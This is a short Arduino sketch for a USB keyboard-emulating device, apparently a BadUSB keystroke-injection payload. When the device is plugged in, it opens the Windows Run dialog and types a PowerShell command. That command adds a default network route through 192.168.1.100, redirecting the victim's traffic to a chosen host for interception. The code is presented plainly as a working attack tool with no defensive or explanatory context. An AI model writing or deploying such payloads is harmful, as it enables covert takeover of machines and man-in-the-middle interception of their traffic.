#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println(F("powershell -c \"New-NetRoute -DestinationPrefix 0.0.0.0/0 -NextHop 192.168.1.100\""));
}

void loop() {}
